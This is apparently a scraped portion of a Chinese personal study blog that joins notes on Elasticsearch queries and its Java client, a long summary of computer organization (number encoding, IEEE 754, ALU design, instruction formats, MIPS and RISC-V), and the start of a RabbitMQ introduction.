\u0026#34;查询类型\u0026#34;: { \u0026#34;查询条件\u0026#34;: \u0026#34;条件值\u0026#34; } } } 叶子 全文检索：分词 match 查询 mult_match 允许同时查询多个字段 精确查询：不分词，直接精确匹配 term 查询，整体到词条中寻找 range 地理查询：用于搜索地理位置 复合 基于逻辑运算组合叶子 bool：子句must、should、must_not、filer 基于算法修改查询时的文档相关性算分，从而改变排名 function_score dis_max 排序和分页 排序：\n添加 sort 标签，默认按照 _score 排序 分页：\n添加 from 、size 深度分页问题： es 一般对数据进行分片存储，导致查询数据时需要汇总各个分片的数据 解决方案：\nsearch after，分页时需要排序，每次查询从上一次的排序值开始。但只能向后逐页查询 scrool，将排序数据形成快照，保存在内存 设置上限 高亮显示 在搜索结果中把搜索关键字突出显示\nfield标签加上pre_tags、post_tags Java 客户端 JavaRestClient\n初始化 1 2 3 RestHighLevelClient client = new RestHighLevelClient(RestClient.builder( HttpHost.create(\u0026#34;http://192.168.150.101:9200\u0026#34;) )); Mapping 映射 结合业务分析所需字段（区分是否需要和是否搜索）\n搜索字段 排序字段 展示字段 索引库操作 基于 RestFul格式：\n1 2 3 4 5 6 7 8 9 @Test void testCreateHotelIndex() throws IOException { // 1. 创建Request对象 CreateIndexRequest request = new CreateIndexRequest(\u0026#34;items\u0026#34;); // 2. 请求参数，MAPPING_TEMPLATE是静态常量字符串，内容是JSON格式请求体 request.source(MAPPING_TEMPLATE, XContentType.JSON); // 3. 发起请求 client.indices().create(request, RequestOptions.DEFAULT); } 文档操作 新增文档的 API\n1 2 3 4 5 6 7 8 9 @Test void testIndexDocument() throws IOException { // 1. 创建request对象 IndexRequest request = new IndexRequest(\u0026#34;indexName\u0026#34;).id(\u0026#34;1\u0026#34;); // 2. 准备JSON文档 request.source(\u0026#34;{\\\u0026#34;name\\\u0026#34;: \\\u0026#34;Jack\\\u0026#34;, \\\u0026#34;age\\\u0026#34;: 21}\u0026#34;, XContentType.JSON); // 3. 发送请求 client.index(request, RequestOptions.DEFAULT); } 文档批处理 add 多个 index，然后统一请求即可\n完成批量导入数据 1 2 3 4 5 6 7 8 9 10 11 void testBulk() throws IOException { // 1. 创建Bulk请求 BulkRequest request = new BulkRequest(); // 2. 添加要批量提交的请求：这里添加了两个新增文档的请求 request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;101\u0026#34;).source(\u0026#34;json source\u0026#34;, XContentType.JSON)); request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;102\u0026#34;).source(\u0026#34;json source2\u0026#34;, XContentType.JSON)); // 3. 发起bulk请求 client.bulk(request, RequestOptions.DEFAULT); } 准备文档数据\n准备请求参数\n发送请求\nRTL 查询 SearchRequest 对象，发请求\n解析结果\n得到 Hits 属性，结果是数组\n复合、排序、分页 用指定对象、设置指定参数即可\nboolquery、source\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testBool() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.准备bool查询 BoolQueryBuilder bool = QueryBuilders.boolQuery(); // 2.2.关键字搜索 bool.must(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.3.品牌过滤 bool.filter(QueryBuilders.termQuery(\u0026#34;brand\u0026#34;, \u0026#34;德亚\u0026#34;)); // 2.4.价格过滤 bool.filter(QueryBuilders.rangeQuery(\u0026#34;price\u0026#34;).lte(30000)); request.source().query(bool); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 分页：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @Test void testPageAndSort() throws IOException { int pageNo = 1, pageSize = 5; // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.搜索条件参数 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.排序参数 request.source().sort(\u0026#34;price\u0026#34;, SortOrder.ASC); // 2.3.分页参数 request.source().from((pageNo - 1) * pageSize).size(pageSize); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 高亮：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testHighlight() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.query条件 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.高亮条件 request.source().highlighter( SearchSourceBuilder.highlight() .field(\u0026#34;name\u0026#34;) .preTags(\u0026#34;\u0026lt;em\u0026gt;\u0026#34;) .postTags(\u0026#34;\u0026lt;/em\u0026gt;\u0026#34;) ); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 数据聚合 对文档数据进行统计、分析\n桶：对文档做而非女足 度量 Metric：计算某些特定值 管道 Pipeline：以其他聚合的结果为基础做聚合 DSL aggs 定义聚合\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /items/_search { \u0026#34;query\u0026#34;: {\u0026#34;match_all\u0026#34;: {}}, // 可以省略 \u0026#34;size\u0026#34;: 0, // 设置size为0，结果中不包含文档，只包含聚合结果 \u0026#34;aggs\u0026#34;: { // 定义聚合 \u0026#34;cateAgg\u0026#34;: { // 给聚合起个名字 \u0026#34;terms\u0026#34;: { // 聚合的类型，按照品牌值聚合，所以选择term \u0026#34;field\u0026#34;: \u0026#34;category\u0026#34;, // 参与聚合的字段 \u0026#34;size\u0026#34;: 20 // 希望获取的聚合结果数量 } } } } RestClient 构造聚合 指定名称、类型、字段\n1 2 3 4 5 6 7 request.source().size(0); request.source().aggregation( AggregationBuilders .terms(\u0026#34;brand_agg\u0026#34;) .field(\u0026#34;brand\u0026#34;) .size(20) ); ","date":"2025-10-04T00:00:00Z","permalink":"https://calendar0917.github.io/posts/elasticsearch/","title":"ElasticSearch"},{"content":"第一章 计算机系统概述 计算机系统的发展 计算机系统 = 硬件 + 软件\n软件 系统软件：用来管理整个计算机系统\n应用软件：按任务需要编制成的程序\n硬件 第一台电子数字计算机：ENIAC\n逻辑元件（用于处理电信号的最小单元）：电子管\n十进制表示，手动编程\n无冯 · 诺伊曼结构\n第二代：晶体管\n元器件：逻辑元件（晶体管），内存（磁芯），外存（磁鼓，磁带） 特点：变址，浮点运算，多路存储器，I/O 处理机，中央交换结构（非总线）。 软件：使用高级语言，提供系统软件。 第三代：中小规模集成电路\n元器件：逻辑元件和主存储器均由集成电路实现。 特点：微程序控制，Cache，虚拟存储器，流水线。 代表机种：IBM 360（大型机），DEC PDP-8（小型机），巨型机。 IBM 360（兼容机）\n相同/相似的指令集\u0026amp;操作系统。\n好处： 原来机器上的程序可以不改动而在新机器上运行，但性能不同。\n保持兼容的关键：低端机指令集是高端机的一个子集，称为“向后兼容”。\nDEC PDP-8（采用总线结构）\n总线结构好处：可扩充性好（允许将新的符合标准的模块插入总线，形成各种配置），节省器件，体积小，价格便宜\n第四代：大规模、超大规模集成电路\n半导体存储器，微处理器发展迅速。 特点：共享存储器，分布式存储器以及大规模并行系统。 组成 冯诺依曼结构模型 冯诺依曼提出存储程序，取代手动接线。\n冯诺依曼结构：\n计算机由运算器，控制器，存储器，输入设备和输出设备五个基本部件组成。 各基本部件功能： 存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令； 控制器应能自动执行指令； 运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备和输出设备与主机进行通信。 内部以二进制数表述指令和数据 每条指令由操作码和地址码两部分组成。操作码指出操作的类型，地址码指出操作数的地址。 由一串指令组成程序。 采用存储程序工作方式 将事先编好的程序和原始数据送入主存中；启动执行后，在不需操作人员干预下，自动完成逐条取出指令和执行指令的任务。 基本部件及其功能 运算器（数据运算）：ALU、GPRs、标志寄存器等。 存储器（数据存储）：存储阵列、地址译码器、读写控制电路 总线（数据传送）：数据线（MDR）、地址线（MAR）和控制线 控制器（控制）：对指令译码生成控制信号 CPU = 运算器 + 控制器\n主机 = CPU + 主存\n各硬件工作原理 主存储器 主存储器 = 存储体 + MAR + MDR\nMemory Address Register 存储地址寄存器：指示位置，位数反应存储单元的个数 Memory Data Register 存储数据寄存器：指示存入、取出的具体数据（包括指令） 存储体：数据、指令在存储体内按地址存储，每个存储单元对应一个地址 1B = 1 byte ; 1 b = 1 bit\nMAR、MDR 逻辑上属于主存，但被集成到 CPU\n运算器 实现算数运算、逻辑运算\n运算器 = ACC + ALU + MQ + X\nAccumulator：累加器，存放操作数或运算结果 Multiple-Quotient Register：乘商寄存器，乘除运算时，存放操作数或运算结果 Arithmetic and Logic Unit：算数逻辑单元，通过复杂电路实现算数运算、逻辑运算 X：通用的操作数寄存器，用于存放操作数 控制器 控制器 = CU + IR +PC\nControl Unit:控制单元，分析指令，给出控制信号\nInstruction Register:指令寄存器，存放当前执行的指令\nProgram Counter:程序计数器，存放下一条指令地址，有自动加1功能\n配合 指令和数据 程序启动前，指令和数据都存储在存储器中，形式上没有区别，都是 0/1 序列。 采用存储程序的工作方式，程序由指令组成，启动后计算机自动取出一条条指令并执行，无需人的干预。 指令执行过程中，指令和数据从存储器取到 CPU，指令存在 IR 中，数据在 GPR 中。 指令需要给出的信息 操作码：指令的操作，加减法等 一个或多个源操作数：立即数、寄存器编号、存储地址 目的操作数地址：寄存器编号、存储地址 执行过程 程序执行前 数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放。指令由 OP、ADDR 字段组成，程序起始地址送入 PC。 开始执行程序 根据 PC 取指令送 IR：PC -\u0026gt; MAR -\u0026gt;存储器 -\u0026gt; MDR -\u0026gt; IR 指令译码：IR -\u0026gt; 控制器，控制器译码 取操作数：GPRs 或存储器 -\u0026gt; ALU 执行指令操作：ALU 运算 回写结果到 GPRs 或存储器 修改 PC 的值，使其指向下一条指令 重复上述步骤直到程序完成 软件 系统软件——简化编程，使硬件资源被有效利用 操作系统：硬件资源管理，用户接口 语言处理程序：翻译程序，Linker，Debug\u0026hellip; 翻译程序 汇编器（Assembler）：汇编语言源程序-\u0026gt;机器目标程序。或许叫汇编器更好理解？ 编译器（Complier）：高级语言程序-\u0026gt;汇编/机器目标程序。或许叫编译器更好理解？ 解释器（Interpreter）：将高级语言程序语句逐条翻译成机器指令并执行，不生成目标文件。（跳过汇编阶段） 其他实用程序：磁盘碎片整理、备份程序\u0026hellip; 机器语言：二进制代码\n汇编语言：助记符\n高级语言：C、C++、……\n应用软件——解决具体的应用问题 层次结构 语言层次 微指令系统：直接控制硬件执行 机器语言：传统机器M1，执行二进制机器指令 操作系统机器\n汇编语言：虚拟机器M2，用汇编语言翻译成机器语言\n高级语言：虚拟机器M3，需要编译成汇编、机器语言\n上两层视为硬件层\n计算机体系结构：讨论如何设计硬件与软件之间的接口\n计算机组成原理：讨论如何用硬件实现接口\nISA 指令集体系结构，其作为规约，规定了如何使用硬件。\n可执行的指令集合，包括指令格式、操作种类以及对应操作数的规定。 可以接受的操作数类型。 操作数存放的寄存器组结构，例如寄存器名称、编号、长度和用途。 操作数存放的存储空间的大小和编址方式。 操作数在存储空间中按大/小端方式存放。 指令获得操作数的方式，即寻址方式。 指令执行过程的控制方式，例如程序计数器，条件码定义等。 ISA 是计算机系统中必不可少的抽象层。\n性能指标 存储器 总容量 = 存储单元个数 * 存储字长(bit)\nCPU 基本概念 主频：CPU内数字脉冲信号振荡的频率\n= 1 / 时钟周期 CPI：执行一条指令需要多少个时钟周期（不同指令，CPI不同）\nCPU执行时间：执行整个程序的耗时 = (条数 * CPI) / 主频\nIPS：每秒执行多少个命令 = 主频 / 平均CPI\nFLOPS：每秒执行多少次浮点运算\nK=Kilo=千=10^3\nM=Million=百万=10^6\nG=Giga=十亿=10^9\nT=Tera=万亿=10^12\n数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）\n吞吐量：单位时间内处理请求的数量\n相应时间：CPU时间 + 等待时间\n基准程序：用于测量的程序\nMIPS（Million Instructions Per Second）：每秒执行多少百万条指令，着重点在于单条指令。\nMIPS 为平均值，其并没有考虑以上三个属性，并且由于：\n不同机器指令集不同 程序由不同指令混合而成 指令的频率会动态变换 厂家给出峰值 MIPS 因此，MIPS 表示性能存在局限性。\nMFLOPS：每秒执行浮点运算多少百万次，着重在于浮点操作本身。\n计算 CPU 执行时间=CPI×程序总指令条数×时钟周期\n第二章 数据的机器级表示 信息二进制编码 计算机内部数据：二进制表示\n机器级数据：\n数值数据，无符号/带符号整数，浮点数，十进制数 非数值数据，逻辑数，汉字 二进制编码原因：\n制造两个稳态的物理器件容易 二进制编码、计数、运算规则简单。 与逻辑命题对应，便于逻辑运算，方便地用逻辑电路实现算术运算。 机器数：0/1 编码的 0/1 内部 0/1 序列。\n真值：机器数真正的值\n数值数据表示方法 三要素：\n进位计数制：十进制，二进制等转换。 定点浮点表示：定点整数/小数；浮点数（使用一个定点小数和一个定点整数表示） 编码：原码补码反码等。 若不知道三要素，那么便无法得知机器数的具体真值。\n进制转换：\n二进制 -\u0026gt; 其他：划分位数，对应 十六、八 -\u0026gt; 二：位数对应，补全 十进制 -\u0026gt; 任意位数：求商取余 定点数的表示 常规计数，小数点位置固定。整数、小数分开存储。\n无符号数：没有符号位\n原码：\n有 +0、-0 两种表示形式 反码：\n正数与原码相同 若符号位为1，则数值位全部取反 依然有 +0、-0 补码：\n将减法抓换为等价的加法（加上补数） = 原码除符号位外，取反后加一（即反码 + 1） 移码： 将每一个数值加上一个偏置常数（ bias）\n一般来说，当编码位数为 n **时，bias 取 2^n 标准移码\n为什么要用移码来表示阶码？\n便于浮点数加减运算时的对阶操作（比较大小）\n与补码的关系：最高位相反，其余位相同\nC语言的解析 无符号数变为有符号：不改变数据内容，改变解释方式\n长变短：高位截断，保留地位\n短变长：符号扩展\n负数补1，正数补0 IEEE编码 规定了二进制浮点数算数标准，类似科学计数法简化计数\n二进制浮点数 符号：决定数值的正负性\n尾数：影响数值的精度。尾数的位数越多，精度越高\n阶码：反映小数点的实际位置\n基数：K进制通常默认基数为K\n规格化：石确保尾数的最高位非0数位刚好在小数点之前\nfloat型：32位单精度\n符号 + 阶码 + 尾数：1 + 8 + 23 double型：64位双精度\n符号 + 阶码 + 尾数：1 + 11 + 52 float单精度 默认存储规格化尾数，小数点前的1省略（隐含）\n基数规定为 2\n阶码用移码表示，规定偏置值为 127\n如何将十进制真值转换为偏置值为M的移码？\n将十进制真值+偏置值\n按“无符号整数”规则转换为指定位数\ndouble双精度 偏置值为1023 表示范围 特殊状态 阶码全 0，或阶码全 1\n阶码真值的取值范围为 -126 ~ 127（单精度） 根据数轴，存在：\n正上溢、正下溢、负上溢，负下移 上溢置为无穷，下溢置为0 数据表示 十进制数表示 ASCII 码：就是把数字当作字符存储，0-9用30H-39H表示\n前分隔：正号用 2B 负号用 2D 放在最前面 后嵌入：将符号嵌入最低位数字的 ASCII 码高 4 位中。 正数不变；负数高 4 位变为 0111。 BCD 码\n每 1 位十进制数用 4 位二进制表示。而 4 位二进制数可组合成 16 种状态，只需要选 10 种状态来表示十进制数。 西文字符表示： 复习要点中未提到\n十进制数字：0/1/2…/9 10 个 英文字母：A/B/…/Z/a/b/…/z 52 个 专用符号：+/-/%/*/\u0026amp;/…… 33 个 控制字符（不可打印或显示） 33 个 汉字表示 输入码：用于输入汉字。 内码：用于在系统中进行存储、查找、传送等处理 字模点阵或轮廓描述：用于显示/打印 数据的宽度 bit 字节： 现代计算机中，存储器按字节编址 字节是最小可寻址单位 （addressable unit ） LSB 表示最低有效字节，MSB 表示最高有效字节 字 表示被处理信息的单位，用来度量数据类型的宽度 字长 指某特定机器定点运算时数据通路的宽度。 数据通路： CPU 内部进行数据运算、存储和传送的路径以及路径上的部件。 等于 CPU 内部总线的宽度，或运算器的位数，或通用寄存器的宽度。 数据的存储和排列顺序 大小端 小端（ Little Endian）:低字节放低地址 大端（ Big Endian）:高字节放低地址 指令中，操作码和寄存器号的存放顺序不变，只需要考虑立即数的顺序 对齐：要求数据存放的地址必须是相应的边界地址 每次访存只能读写一个字 浪费一定空间，换取存取时间 数据的检错与纠错 大多采用“冗余校验”思想，即除原数据信息外，还增加若干位编码，这些新增的代码被称为校验位。\n奇偶校验码 海明校验码 循环冗余校验码 第三章 运算方法和运算部件 加法器 串行进位 传递速度慢\n并行进位 用先行进位优化，各进位之间无等待，相互独立并同时产生\n但全先行电路复杂，成本高\n局部先行进位加法器： 组内并行、组间串行\n用多个位数较少的 n 位全先行进位加法器进行串联 多级先行进位加法器： 组内并行、组间并行\nALU的构成 ALU 如何控制实现加、减、与、或等等各种功能； 无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加/减运算部件。 在整数加/减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现 ALU、乘/除运算以及浮点运算。 ALU 的 OF、SF、CF 和 ZF 标志信息如何产生。 零标志 ZF、溢出标志 OF、进/借位标志 CF、符号标志 SF 称为条件标志。 条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中 存放标志的寄存器通常称为程序/状态字寄存器或标志寄存器。 溢出条件：\n无符号加、减溢出条件：CF=1 带符号加、减溢出条件：OF=1 定点数运算 移位 逻辑移位\n针对无符号数\n左移 n 位，即乘上位权的 n 次方。\n高位溢出丢弃，低位补 0\n算数移位\n左移与逻辑移位类似，但移到符号位结果更改 右移：低位移出丢弃，但高位补符号位，若移出 1，则发生精度丢失 加减 原码\n减法用减法器实现，1 变 0 补码\n符号位可以一起参与运算 [A+B]补=[A]补+ [B]补 [A-B]补=[A]补+[-B]补 [-B] 补 = [B] 补的 “取反加 1”，符号位也参与取反\n溢出判断：上溢正变负；只有可能同号运算出现；判断是否在合法表示范围内即可 乘法 无符号整数： 模拟手算乘法即可，计算机还需拆分部分积 具体实现：\n带符号整数 给无符号整数乘法电路添加一辅助位，让符号位参与运算。\n计算机底层判断溢出：\n若 2n 位的高 n + 1 位不均相同，则溢出 实现方式 ALU + 移位器 + 寄存器 + 控制逻辑 阵列乘法器 逻辑运算模拟 浮点数运算 浮点数加减运算的对阶原则和方法；\n原则：小阶向大阶看齐\n方法：阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值\nIEEE 754 尾数右移时，要将隐含的“1”移到小数部分，高位补 0，移出的低位保留到特定的“附加位”上\n如何计算移码表示的阶码的和与差（标准移码与 IEEE754 移码有什么差别）；\n阶码加法公式为： Eb ← Ex + Ey + 129 （ mod 2^8）\n阶码减法公式为： Eb ← Ex + [–Ey]补 + 127 （ mod 2^8）\n如何计算一个移码数减 1\n尾数规格化中的右规和左规方法；\n当尾数高位为 0，则需左规：尾数左移一次，阶码减 1，直到 MSB 为 1 每次阶码减 1 后要判断阶码是否下溢 先判断阶码是否为全 0，若是，则直接置阶码下溢；否则，阶码减 1 后判断阶码是否为全 0，若是，则阶码下溢。 当尾数最高位有进位，需右规：尾数右移一位，阶码加 1，直到 MSB 为 1 每次阶码加 1 后要判断阶码是否上溢 先判断阶码是否为全 1，若是，则直接置阶码上溢；否则，阶码加 1 后判断阶码是否为全 1，若是，则阶码上溢。 阶码溢出异常处理： 阶码上溢，则结果溢出； 阶码下溢，则结果为 0 乘法运算结果不需左规！最多右规 1 次！ 除法最多左规 1 次！不需右规！ 尾数的舍入处理常用方法；\n就近舍入：舍入为最近可表示的数 若为非中间值：LSB 后 1 位 0 舍 1 入 若为中间值：强迫结果为偶数， LSB= 1.1101110 → 1.1110 (1.1101110 → 1.1110, 110\u0026gt;100, 1.1101+0.0001 = 1.1110) 1.1101011 → 1.1101 (1.1101011 → 1.1101, 011\u0026lt;100, 1.1101+ 0 = 1.1101) 1.1101101 → 1.1110 1.1111100 → 10.0000 (1.1111100 → 10.0000, 100=100, 1.1111+0.0001 = 10.0000) 朝+∞方向舍入：舍入为右边最近可表示数 （正向舍入） 例：-1.1101101 →-1.1101 ； 1.1101101 →1.1110 朝-∞方向舍入：舍入为左边最近可表示数 （负向舍入） 例：-1.1101101 →-1.1110 ； 1.1101101 →1.1101 朝 0 方向舍入：直接截取所需位，后面的位丢弃。这种方法最简单 如何判断结果溢出（上溢和下溢）。\n第四章 指令格式 指令：是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。\n根据地址码数不同 零地址指令： 不需要操作数，如停机、关中断等 堆栈计算机，操作数隐藏在栈顶 一地址指令： 只需单操作数，如加一、取反 需两个操作数，但其中一个存储在某个寄存器内 二地址指令： 用于需要两个操作数的算术运算 三地址指令： 多一个地址存储结果 四地址指令： 再多一个地址存储下一个指令地址 指令位数不变时，地址码数越多，寻址能力越差\n按指令长度分类 指令字长：一条指令的总长度(可能会变)\n影响取指令所需时间\n机器字长：CPU进行一次整数运算所能处理的二进制数据的位数(通常和ALU直接相关)\n存储字长：一个存储单元中的二进制代码位数（通常和MDR位数相同)\n按操作码长度分类 定长：译码电路设计简单，但复杂性低\n按操作类型分类 数据传送\nLOAD：把存储器中的数据放到寄存器中\nSTORE： 把寄存器中的数据放到存储器中\n算数逻辑操作\n算数、逻辑（与或非、位操作） 移位操作\n算数、逻辑、循环移位 转移操作（改变程序执行流，PC指针改变）\n无条件转移 JMP\n条件转移JZ：结果为0；JO：结果溢出；JC：结果有进位\n调用和返回 CALL和RETURN\n陷阱(Trap)与陷阱指令\n输入输出操作\nCPU寄存器与IO端口之间的数据传送(端口即IO接口中的寄存器) 设计 指令格式的选择应遵循的几条基本原则 应尽量短 要有足够的操作码位数 指令编码必须有唯一的解释，否则是不合法的指令 指令字长应是字节的整数倍 合理地选择地址字段的个数 指令尽量规整 一条指令必须明显或隐含包含以下信息： 操作码：指定操作类型 源操作数或其地址：一个或多个源操作数所在的地址 结果的地址：产生的结果存放何处（目的操作数） 下一条指令地址：下条指令存放何处 指令的寻址方式\u0026mdash;-简单 顺序执行：PC增值 跳转 （ jump / branch / call / return ）：同操作数寻址 操作数的寻址方式\u0026mdash;-复杂 操作数来源：寄存器 / 主（虚）存 /外设端口 / 栈顶 操作数结构：位 / 字节 / 半字 / 字 / 双字 / 一维表 / 二维表 /… 通常寻址方式特指“操作数的寻址” 扩展操作码 格式：定长指令字结构 + 可边长操作码\n即不同地址数的指令使用不同的操作码，便于判断 通常情况下，对使用频率较高的指令，分配较短的操作码；对使用 频率较低的指令，分配较长的操作码，从而尽可能减少指令译码和 分析的时间。\n设地址长度为n，上一层留出m种状态，下一层可扩展出mx2^n种状态\n注意短的操作码不能是长操作码的前缀\n寻址方式 PC：程序计数器，取址后会自动加一\n指令寻址 确定下一条指令的存放地址，由 PC 指明\n顺序寻址：\nPC + ”1“ 1 理解为一个指令字长，根据指令字长变化字节编码 跳跃寻址\n执行转移指令导致 PC 值改变（直接修改） 数据寻址 确定本条指令的地址码指明的真实地址\n程序存储位置是相对的，需要用偏移量解读\n在地址码中划分出寻址特征，规定该地址需要用何种方式寻址\n直接寻址：存储 = 真实，即 EA = A\n间接寻址：存储的是真实值的地址，即 EA = （A）\n寄存器寻址：指令字中直接给出操作数所在寄存器编号\n寄存器间接寻址：寄存器存储的是操作数所在储存单元的地址，即 EA = （R）\n隐含寻址：非显示给出的操作数\n立即寻址：地址就是操作数本身，又称立即数\n基址寻址：以程序的起始存放地址作为起点，EA = （BR）+ A\nBR 为基址寄存器，由操作系统决定，不可更改\n变址寻址：程序员自己决定从哪里作为起点，EA = （IX）+ A IX 为变址寄存器，可由用户决定。类似一个指针，设置为数组首地址等\n相对寻址：程序计数器PC所指地址作为起点，EA = （PC）+ A\n堆栈寻址：操作数存放在堆栈中，隐含使用堆栈指针(SP)作为操作数地址。\n堆栈可以用寄存器实现（硬堆栈）或主存实现，硬堆栈不妨存，速度快\n优缺点 条件测试方式(?) 对于带符号数和无符号数运算，标志生成方式有没有不同？\n答：没有，因为加法电路不知道是无符号数还是带符号整数！\n指令系统设计风格 累加器型： （earliest machines） 特点：其中一个操作数（源操作数 1）和目的操作数总在累加器中 堆栈型： （e.g. HP calculator, Java virtual machines) 特点：总是将栈顶两个操作数进行运算，指令无需指定操作数地址 通用寄存器型： （e.g. IA-32, Motorola 68xxx) 特点：操作数可以是寄存器或存储器数据（即 A、B 和 C 可以是寄存器或存储单元） 装入/存储型： （e.g. SPARC, MIPS, PowerPC) 特点：运算指令的操作数只能是寄存器数据，只有 load/store 能访问存储器 指令集：CISC 和 RISC CISC（Complex Instruction Set Computer）：\n一条指令完成一个复杂的基本功能。 x86 架构 RISC（Reduced Instruction Set Computer）：\n一条指令完成一个基本“动作”；多条指令组合完成一个复杂的基本功能。\n电路简单，功耗小，寄存器多\n只有 LOAD、STORE 指令可以访存\nARM 架构，主要用于手机、平板\n在程序中各种指令出现的频率悬殊很大，最常使用的是一些简单指令，这些指令占程序的80%，但只占指令系统的20%。而且在微程序控制的计算机中，占指令总数20%的复杂指令占用了控制存储器容量的80%。\nMIPS 的指令格式 所有指令都是32位宽（字长），按字地址对齐存储，字地址为4的倍数\n分为 R、I、J 型\nR 型 参与运算的操作数和结果都在寄存器，R 型指令的寻址方式只有寄存器寻址一种； R 型指令的 op 全为 0，具体功能由 func 部分确定； rs：第一个源操作数（source register） rt：第 2 个源操作数（target register） rd：目的寄存器（destination register） shamt：对非移位指令为 00000。移位指令为移位次数。 I 型 指令中包含了一个立即数，所以称为 I 型指令。 op：确定指令的功能； rs：可以是一个源操作数，寄存器寻址；或者在存取指令中用作基址寄存器，偏移寻址。 rt：目的寄存器 Immediate：长度为 16 位的立即数，指令执行时需扩展为 32 位。根据指令的不同，可以有以下三种用法： 运算类指令（ori）：以立即寻址方式提供的一个源操作数。 存取指令（lw/sw）：作为偏移量，与寄存器 rs 组成偏移寻址方式，提供一个存储器操作数。 条件转移指令（bne）：作为偏移量，与 PC 寄存器组成相对寻址方式，提供一个转移目的地址。 J 型 op：确定指令的功能 address：转移地址 整合 三种指令 汇编格式 a=b op c 把=和op变成逗号 R型指令格式是op+rs+rt+rd+shamt+func 汇编格式是 xxx $rs, $rt, $rd I型指令格式是op+rs+rt+imm 汇编格式是 xxx $rt, $rs, imm J型指令格式是op+addr 汇编格式是 xxx addr MIPS 的通用寄存器 0 号寄存器$zero 为固定值零，不能改变 MIPS还提供了32个32位的单精度浮点寄存器$f0∽$f31,用于浮点数指令。它们可配对成16个64位的双精度浮点寄存器。 在汇编语言中使用寄存器时可以用寄存器名，也可以用寄存器号，前面加上“$”,例如，$8或$t0。 寄存器 长度：32 位 个数：32 个 MIPS 的寻址方式 寄存器寻址 可以出现在 R 型和 I 型格式中 立即数寻址 偏移寻址 PC 相对寻址 PC\u0026lt;\u0026ndash; PC+4+imm*4 伪直接寻址 为什么称伪直接？ 最终地址：PC 高四位+addr+两个 0，+表示拼接 位数：4+26+2=32 机器语言的解码（反汇编）？ 高级语言、汇编语言、机器语言之间的转换 ？ RISC-V 指令系统 具有模块化结构，稳定性和可扩展性好，在简洁性、实现成本、功耗、性能和程序代码量等各方面具有显著优势。\n模块化结构：\n核心：RV32I + 标准扩展集：RV32M、RV32F、RV32D、RV32A = RV32G 32位架构RV32G = RV32IMAFD，其压缩指令集RV32C（指令长度16位） 64位架构RV64G = RV64IMAFD，其压缩指令集RV64C（指令长度16位） 向量计算RV32V和RV64V；嵌入式RV32E（RV32I的子集，16个通用寄存器） 指令格式 32位 R-型为寄存器操作数指令\nI-型为短立即数或装入（Load）指令\nS-型为存储（Store）指令\nB-型为条件跳转指令\nU-型为长立即数操作指令\nJ-型为无条件跳转指令\n16位压缩 ","date":"2025-10-03T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","title":"计算机组成原理"},{"content":"初识 MQ 服务调用类型 同步调用 服务 A 同时请求多个服务，导致服务种类的不断扩增，服务的等待耗时增加。\n缺点：\n扩展性差\n性能下降\n级联失败问题\n异步调用 基于消息通知的方式，包含：\n消息发送者：即原来的调用者 消息接收者：接收和处理消息的人 消息代理：管理、暂存转发消息 不再同步调用业务关联度第的服务，而是分别发送消息到 Broker\n接触耦合，扩展性强\n无需等待，性能好\n故障隔离\n缓存消息，流量削锋填谷\n技术选型 RabbitMQ、ActiveMQ、RocketMQ、Kafka\n部署 Docker安装即可\n整体架构：\npublisher：消息发送者 consumer：消息消费者 queue：队列，存储消息 exchange：交换机，负责路由消息 vertual-host：虚拟主机，用于数据隔离 消息发送给交换机，再由交换机分发给对应的 queue，交换机没有消息存贮的能力。\nJava客户端 AMQP：无协议传输\n封装为 Spring AMQP 再封装为 SpringRabbit，RabbitTemplate包装类 收发消息 发送：\n1 2 3 4 5 6 7 8 9 10 11 12 @Autowired private RabbitTemplate rabbitTemplate; @Test public void testSimpleQueue() { // 队列名称 String queueName = \u0026#34;simple.queue\u0026#34;; // 消息 String message = \u0026#34;hello, spring amqp!\u0026#34;; // 发送消息 rabbitTemplate.convertAndSend(queueName, message); } 接收：\n1 2 3 4 5 6 7 8 9 @Slf4j @Component public class SpringRabbitListener { @RabbitListener(queues = \u0026#34;simple.queue\u0026#34;) public void listenSimpleQueueMessage(String msg) throws InterruptedException { log.info(\u0026#34;spring 消费者接收到消息: [\u0026#34; + msg + \u0026#34;] \u0026#34;); } } Work Queues 多个消费者绑定到一个队列\n一条消息只能被一个消费者处理\n多条消息，默认轮流接收\n通过添加消费者来处理超量数据\n修改配置\n修改 prefetch 来控制消费者预取的消息数量，使性能高的服务器多处理 交换机 